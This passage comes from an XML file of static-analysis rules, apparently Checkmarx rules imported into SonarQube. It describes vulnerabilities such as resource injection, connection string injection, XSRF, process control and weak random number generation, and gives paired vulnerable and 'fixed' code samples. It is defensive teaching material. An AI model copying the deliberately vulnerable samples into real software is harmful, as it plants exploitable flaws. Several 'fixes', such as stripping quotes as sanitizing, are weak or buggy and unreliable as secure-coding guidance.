}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_592</key><name>Resource_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could open a backdoor enabling the attacker to connect directly to the application server, potentially leading to server takeover or other direct attacks.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application opens a network socket, for listening to incoming network connections. However, the application uses user input to define the socket, enabling an attacker to control it.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Don&amp;#8217;t allow a user to define parameters of network sockets.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application opens a network socket using a port number inputed by the user
      &lt;/h4&gt;&lt;pre&gt;

class ResourceInjection
{
            public void foo(TextBox textBox1)
        {
                        long address = Convert.ToInt32(textBox1.Text);
            IPEndPoint endpoint = new IPEndPoint(address, port);
            Socket socket = new Socket(endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(endpoint);
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The application opens a hard-coded port number and does receive it from the user
      &lt;/h4&gt;&lt;pre&gt;

class ResourceInjection
{
            public void foo(TextBox textBox1, long address)
        {
            IPEndPoint endpoint = new IPEndPoint(address, 15551);
            Socket socket = new Socket(endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(endpoint);
        }
}



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application opens a network socket using a port number inputed by the user&lt;/h4&gt;&lt;pre&gt;public class ResourceInjection {
	public static void main(String[] args) {
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter port number: ");
		int portNumber = Integer.parseInt(userInputScanner.nextLine());
		try {
			ServerSocket serverSocket = new ServerSocket(portNumber);
		} catch (Exception e) {
			System.err.println("Caught Exception: " + e.getMessage());
		}

	}
}&lt;/pre&gt;&lt;h4&gt;The application opens a hard-coded port number according to the user input&lt;/h4&gt;&lt;pre&gt;public class ResourceInjectionFixed {
	public static void main(String[] args) {
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter port name: ");
		String portName = userInputScanner.nextLine();
		int portNum;
		switch (portName) {
		case "ftps":
			portNum = 989;
			break;
		case "ftp":
			portNum = 20;
			break;
		case "smtp":
			portNum = 25;
			break;
		default:
			portNum = 80;
		}
		try {
			ServerSocket serverSocket = new ServerSocket(portNum);
		} catch (Exception e) {
			System.err.println("Caught Exception: " + e.getMessage());
		}
	}
}&lt;/pre&gt;&lt;h3&gt;Python&lt;/h3&gt;&lt;h4&gt;The application opens a network socket using a host name inputed by the user&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import socket
import sys

userInput = stdin.readline()

HOST = userInput 
PORT = 8888 # Arbitrary non-privileged port
	 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Socket created'
	 
#Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
print 'Socket bind complete'&lt;/pre&gt;&lt;h4&gt;The application opens a hard-coded host name and does receive it from the user&lt;/h4&gt;&lt;pre&gt;import socket
import sys

HOST = ''   # Symbolic name, meaning all available interfaces
PORT = 8888 # Arbitrary non-privileged port
	 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Socket created'
	 
#Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
print 'Socket bind complete'&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_589</key><name>Connection_String_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could manipulate the application&amp;#8217;s connection string to its database or other server.Using simple tools and text editing, the attacker might be able do any of the following:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Damage application performance (by increasing the MIN POOL SIZE)&lt;/li&gt;
&lt;li&gt;Tamper with the network connection (for example, via TRUSTED CONNECTION)&lt;/li&gt;
&lt;li&gt;Direct the application to the attacker&amp;#8217;s bogus database&lt;/li&gt;
&lt;li&gt;Discover the password to the system account on the database (by a brute-force attack)&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;To communicate with its database or with another server (for example, Active Directory), the application dynamically constructs a connection string. This connection string includes concatenated user input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could be used to maliciously manipulate the connection string.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Ideally, avoid dynamically building connection strings. If it is necessary to dynamically build a connection string, try not to include user input. In any case use platform-provided utlities, such as .NET&amp;#8217;s SqlConnectionStringBuilder, or at least encode the validated input as appropriate for your platform.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application constructs a connection string using input from the user
      &lt;/h4&gt;&lt;pre&gt;

 class ConnectionStringInjection
{
        static void foo(Textbox textbox1, SqlConnectionStringBuilder bldr)
        {
                bldr.UserID = textbox1.Text;
                myConnection = new SqlConnection(bldr.ToString());
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The user input is first checked for malicious characters before adding to the connection string
      &lt;/h4&gt;&lt;pre&gt;

 class ConnectionStringInjectionFixed
{
        static void foo(Textbox textbox, SqlConnectionStringBuilder bldr)
        {
                bldr.UserID = textbox.Text.Replace("'", "");
                myConnection = new SqlConnection(bldr.ToString());
        }
}



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application constructs a connection string using input from the user&lt;/h4&gt;&lt;pre&gt;public class ConnectionStringInjection {
	public static void main(String[] args) throws SQLException {
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter url name: ");
		String connURL = userInputScanner.nextLine();
		Connection con = DriverManager.getConnection(connURL, "username", "password");
	}
}&lt;/pre&gt;&lt;h4&gt;The user input is translated to a predefined connection string&lt;/h4&gt;&lt;pre&gt;public class ConnectionStringInjectionFixed {
	public static void main(String[] args) throws SQLException {
		HashMap&lt;String, String&gt; sanitize = new HashMap&lt;String, String&gt;();
		sanitize.put("DB_url_1", "DB_url_1");
		sanitize.put("DB_url_2", "DB_url_2");
		sanitize.put("DB_url_3", "DB_url_3");
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter url name: ");
		String connURL = userInputScanner.nextLine();
		Connection con = DriverManager.getConnection(sanitize.get(connURL), "username", "password");
	}
}&lt;/pre&gt;&lt;h3&gt;Python&lt;/h3&gt;&lt;h4&gt;The application constructs a connection string using input from the user&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import cx_Oracle
print 'Insert your ID: '
userInput = stdin.readline()
connection = cx_Oracle.connect(userInput + '/password@99.999.9.99:PORT/SID')&lt;/pre&gt;&lt;h4&gt;The user inputed file number is turned to a string of that number before use&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import cx_Oracle
print 'Insert your ID: '
userInput = stdin.readline()
connection = cx_Oracle.connect(str(int(userInput)) + '/password@99.999.9.99:PORT/SID')&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_627</key><name>Cross_Site_History_Manipulation</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could compromise the browser's Same Origin Policy and violate a user's privacy, by manipulating the browser's History object in JavaScript. This could allow the attacker in certain situations to detect whether the user is logged in, track the user's activity, or infer the&amp;nbsp;state of other conditional values. This may also enhance Cross Site Request Forgery (XSRF) attacks, by leaking the result of the initial attack.&amp;nbsp;&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Modern browsers expose the user's browsing history to local JavaScript as a stack of previously visited URLs. While the browsers enforce a strict Same Origin Policy (SOP) to prevent pages from one website from reading visited URLs on other websites, the History object does leak the size of the history stack. Using only this information, in some situations the attacker can discover the results of certain checks the application performs on the server-side. For example, if the application redirects an unauthenticated user to the login page, a script on another website can detect that whether or not the&amp;nbsp;user is logged in, by checking the length of the History object.&amp;nbsp;&lt;/div&gt;
&lt;div&gt;This information leakage is enabled when the application redirects the user's browser based on the value of some condition, the state of the user's server-side session. E.g. whether the user is authenticated to the application, if the user has visited a certain page with specific parameters, or the value of some application data. For more information, see&amp;nbsp;https://www.checkmarx.com/wp-content/uploads/2012/07/XSHM-Cross-site-history-manipulation.pdf .&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Add the response header "X-Frame-Options: DENY" to all sensitive pages in the application, to protect against the IFrame version of XSHM in modern browser versions.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Add a random value to all targeted URLs as a parameter.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Example of code that leaks the variable state via browser history
      &lt;/h4&gt;&lt;pre&gt;If (!isAuthenticated)
    response.sendRedirect("Login.jsp");     &lt;/pre&gt;&lt;h4&gt;
Example code that prevents history leakage via random token
      &lt;/h4&gt;&lt;pre&gt;if (request.getParameter("r") == null)
    response.sendRedirect("Login.jsp?r=" + (new Random()).nextInt());

If (!isAuthenticated)
    response.sendRedirect("Login.jsp?r=" + (new Random()).nextInt());&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_648</key><name>XSRF</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could cause the victim to perform any action for which the victim is authorized, such as transferring funds from the victim&amp;#8217;s account to the attacker&amp;#8217;s. The action will be logged as being performed by the victim.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application performs some action that modifies database contents, based purely on HTTP request content, and does not require per-request renewed authentication (such as transaction authentication or a cryptographic form token), instead relying on browser or session authentication. This means that an attacker could use social engineering to cause a victim to click a link including a transaction request, and the application would trust the victim&amp;#8217;s browser and would perform the action. This type of attack is known as Cross-Site Request Forgery (XSRF or CSRF).&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Implement a standard or library anti-CSRF mechanism: preferably a built-in platform-provided mechanism or OWASP&amp;#8217;s CSRFGuard. Selective re-authentication or transaction authentication, such as with a cryptographic form token, is also acceptable.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
HttpRequest content is used in a database query without any validation of that content
      &lt;/h4&gt;&lt;pre&gt;

public class XSRF
{
        public void foo(SqliteConnection connection, HttpRequest Request)
        {
                string input = Request.QueryString["user"];
                string sql = "insert into Comments(comment) values (@user)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
            	cmd.Parameters.AddwithValue(@user, input);
            	connection.Open();
            	SqlDataReader reader = cmd.ExecuteReader();
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The HttpRequest content is validated using AntiXsrfTokenKey
      &lt;/h4&gt;&lt;pre&gt;

public class XSRFFixed
{
        public void foo(SqliteConnection connection, AntiXsrf AntiXsrfTokenKey, HttpRequest Request)
        {
                string input = AntiXsrfTokenKey.Validate(Request.QueryString["user"]);
                string sql = "insert into Comments(comment) values (@user)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
            	cmd.Parameters.AddwithValue(@user, input);
            	connection.Open();
            	SqlDataReader reader = cmd.ExecuteReader();
        }

}



      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1675</key><name>Process_Control</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Change the command that the program executes or change the environment in which the command executes.&amp;#160;&lt;/li&gt;
&lt;li&gt;Execute code contained in the native libraries, which often contain calls that are susceptible to other security problems, such as buffer overflows or command injection.&lt;/li&gt;
&lt;li&gt;Affect program parameters, which are part of execution environment, and/or affect the execution flow&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Please note that if the application runs with elevated privileges, the content of the attacker's library will now be run with elevated privileges, possibly giving them complete control of the system.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Process control vulnerabilities occur when data enters the application from an untrusted source and is later used as, or as part of, a string representing a command that is executed in the application, using the Load-Library method. By controlling the name or path of the loaded library, an attacker&amp;#160;can load and execute a malicious library instead of the intended one. This may lead to executing malicious commands (and payloads) on behalf of an attacker.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Libraries that are loaded should come from a trusted source.&amp;#160;If the library does not come from a trusted source, review its&amp;#160;source code.&lt;/li&gt;
&lt;li&gt;All native libraries should be validated to determine if the application requires the use of the library.&lt;/li&gt;
&lt;li&gt;Run the application with the least-privilege principle in order to reduce the impact in case of a successful attack.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;div&gt;&lt;strong&gt;Secure-Code Approach&lt;/strong&gt;&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Sanitize all inputs which influence the library calls in order to avoid malicious content.&lt;/li&gt;
&lt;li&gt;Use absolute path when calling the&amp;#160;library in order to avoid calls to unwanted libraries.&lt;/li&gt;
&lt;li&gt;Validate all inputs&amp;#160;to native calls in order to avoid buffer overflows.&lt;/li&gt;
&lt;li&gt;Use System.load, instead of System.loadLibrary, which is more secured.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Using the application configuration property to load a native library, allowing an attacker to load a library or an executable and potentially execute arbitrary code:&lt;/h4&gt;&lt;pre&gt;string lib = ConfigurationManager.AppSettings["APPHOME"];
Environment.ExitCode = AppDomain.CurrentDomain.ExecuteAssembly(lib);&lt;/pre&gt;&lt;h4&gt;Validating the configuration property before loading a native library:&lt;/h4&gt;&lt;pre&gt;string lib = ConfigurationManager.AppSettings["APPHOME"];
if ( isValidHomePath(lib) )
{
    Environment.ExitCode = AppDomain.CurrentDomain.ExecuteAssembly(lib);
} 
else
{ 
    Console.WriteLine("Action denied.");
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Loading a library from the default Java library path, without validating it:&lt;/h4&gt;&lt;pre&gt;System.loadLibrary("crypto.so");&lt;/pre&gt;&lt;h4&gt;Using an invalidated system property to determine the directory in which it is installed and loads a library file, allowing an attacker to load an arbitrary library:&lt;/h4&gt;&lt;pre&gt;String property = System.getProperty("java.library.path");
System.loadLibrary(property);&lt;/pre&gt;&lt;h4&gt;Loading the library from its absolute path using System.load:&lt;/h4&gt;&lt;pre&gt;String path = "/path/to/lib/";
String lib = "crypto.so";
System.load(path + lib);&lt;/pre&gt;&lt;h3&gt;CPP&lt;/h3&gt;&lt;h4&gt;Using an invalidated registry entry to determine the directory in which it is installed and loads a library file, allowing an attacker to load an arbitrary library:&lt;/h4&gt;&lt;pre&gt;RegQueryValueEx(hkey, "APPHOME", 0, 0, (BYTE*)home, &amp;size);
char* lib=(char*)malloc(strlen(home)+strlen(INITLIB));
if (lib) {
    strcpy(lib,home);
    strcat(lib,INITCMD);
    LoadLibrary(lib);
}&lt;/pre&gt;&lt;h4&gt;Loading the library from its absolute path:&lt;/h4&gt;&lt;pre&gt;std::string apphome = 
"HKEY_LOCAL_MACHINE\\SOFTWARE\MICROSOFT\\WINDOWS NT\\CurrentVersion\\ProfileList\\Default\\";
RegQueryValueEx(hkey, apphone, 0, 0, (BYTE*)home, &amp;size);
char* lib=(char*)malloc(strlen(home)+strlen(INITLIB));
if (lib) {
    strcpy(lib,home);
    strcat(lib,INITCMD);
    LoadLibrary(lib);
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2724</key><name>DB_Control_of_System_or_Config_Setting</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;If an external user can control the application configuration or environment settings, she can disrupt application service, or cause the application to behave unexpectedly, possibly creating&amp;#160;additional vulnerabilities in the application, or even causing the application to perform malicious actions.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application receives unvalidated input from the user, and directly sets that value to the application configuration or environment settings, without properly sanitizing or constraining the input.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not allow user&amp;#160;input,&amp;#160;or otherwise untrusted data, to control sensitive values, particularly configuration or environment settings.&amp;#160;&lt;/li&gt;
&lt;li&gt;Always validate data received from users, before using it for any internal use.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User Input Controlling System Properties&lt;/h4&gt;&lt;pre&gt;public void init() {
    string dbUrl = request.getParameter("dbUrl");
    string remoteWsUrl = request.getParameter("wsUrl");
    
    Properties props = System.getProperties();
    props.setProperty("dbUrl", dbUrl);
    props.setProperty("wsUrl", remoteWsUrl);
    
}&lt;/pre&gt;&lt;h4&gt;Read Properties from Configuration File&lt;/h4&gt;&lt;pre&gt;public void init() {
    Properties props = new Properties(System.getProperties());
    props.loadFromXml(new FileInputStream(CONFIG_FILE_PATH));

}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1672</key><name>External_Control_of_Critical_State_Data</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;If an external user can control the application configuration or environment settings, she can disrupt application service, or cause the application to behave unexpectedly, possibly creating&amp;#160;additional vulnerabilities in the application, or even causing the application to perform malicious actions.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application receives unvalidated input from the user, and directly sets that value to the application configuration or environment settings, without properly sanitizing or constraining the input.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not allow user&amp;#160;input,&amp;#160;or otherwise untrusted data, to control sensitive values, particularly configuration or environment settings.&amp;#160;&lt;/li&gt;
&lt;li&gt;Always validate data received from users, before using it for any internal use.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User Input Controlling System Properties&lt;/h4&gt;&lt;pre&gt;public void init() {
    string dbUrl = request.getParameter("dbUrl");
    string remoteWsUrl = request.getParameter("wsUrl");
    
    Properties props = System.getProperties();
    props.setProperty("dbUrl", dbUrl);
    props.setProperty("wsUrl", remoteWsUrl);
    
}&lt;/pre&gt;&lt;h4&gt;Read Properties from Configuration File&lt;/h4&gt;&lt;pre&gt;public void init() {
    Properties props = new Properties(System.getProperties());
    props.loadFromXml(new FileInputStream(CONFIG_FILE_PATH));

}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_630</key><name>External_Control_of_System_or_Config_Setting</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;If an external user can control the application configuration or environment settings, she can disrupt application service, or cause the application to behave unexpectedly, possibly creating&amp;#160;additional vulnerabilities in the application, or even causing the application to perform malicious actions.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application receives unvalidated input from the user, and directly sets that value to the application configuration or environment settings, without properly sanitizing or constraining the input.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not allow user&amp;#160;input,&amp;#160;or otherwise untrusted data, to control sensitive values, particularly configuration or environment settings.&amp;#160;&lt;/li&gt;
&lt;li&gt;Always validate data received from users, before using it for any internal use.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User Input Controlling System Properties&lt;/h4&gt;&lt;pre&gt;public void init() {
    string dbUrl = request.getParameter("dbUrl");
    string remoteWsUrl = request.getParameter("wsUrl");
    
    Properties props = System.getProperties();
    props.setProperty("dbUrl", dbUrl);
    props.setProperty("wsUrl", remoteWsUrl);
    
}&lt;/pre&gt;&lt;h4&gt;Read Properties from Configuration File&lt;/h4&gt;&lt;pre&gt;public void init() {
    Properties props = new Properties(System.getProperties());
    props.loadFromXml(new FileInputStream(CONFIG_FILE_PATH));

}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1680</key><name>Use_of_Cryptographically_Weak_PRNG</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Random values are often used as a mechanism to prevent malicious users from guessing a value, such as a password, encryption key, or session identifier. Depending on what&amp;#160;this random value is used for, an attacker would be able to predict&amp;#160;the next numbers generated, or previously generated values. This could enable the attacker to hijack another user's session, impersonate another user, or crack an encryption key (depending on what&amp;#160;the pseudo-random value was used for).&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses a weak method of generating pseudo-random values, such that other numbers could be determined from a relatively small sample size. Since the pseudo-random number generator used is designed for statistically uniform distribution of values, it is approximately deterministic. Thus, after collecting a few generated values (e.g. by creating a few individual sessions, and collecting the sessionids), it would be possible for an attacker to calculate another sessionid.&amp;#160;&lt;br /&gt;Specifically, if this&amp;#160;pseudo-random value is used in any security context, such as passwords, keys, or secret identifiers, an attacker would be able to predict&amp;#160;the next numbers generated, or previously generated values.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Whenever unpredicatable numbers are required in a security context, use a cryptographically strong random number generator, instead of a statistical pseudo-random generator.&amp;#160;&lt;/li&gt;
&lt;li&gt;Use the cryptorandom generator that is built-in to your language or platform, and ensure it is securely seeded. Do not seed the generator with a weak, non-random seed. (In most cases, the default is securely random).&amp;#160;&lt;/li&gt;
&lt;li&gt;Ensure you use a long enough random value, to make brute-force attacks unfeasible.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;div&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not use the statistical pseudo-random number generator, use the cryptorandom generator instead. In Java, this is the SecureRandom class.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Objc&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;long sessNum = rand();
NSString* sessionId = [NSString stringWithFormat:@"%ld", sessNum];&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;UInt32 sessBytes;
SecRandomCopyBytes(kSecRandomDefault, sizeof(sessBytes), (uint8_t*)&amp;sessBytes);
    
NSString* sessionId = [NSString stringWithFormat:@"%llu", sessBytes];&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;
Random random = new Random();

long sessNum = random.nextLong();

String sessionId = sessNum.toString();
&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;
SecureRandom random = new SecureRandom();

byte sessBytes[] = new byte[32];

random.nextBytes(sessBytes);

String sessionId = new String(sessBytes);
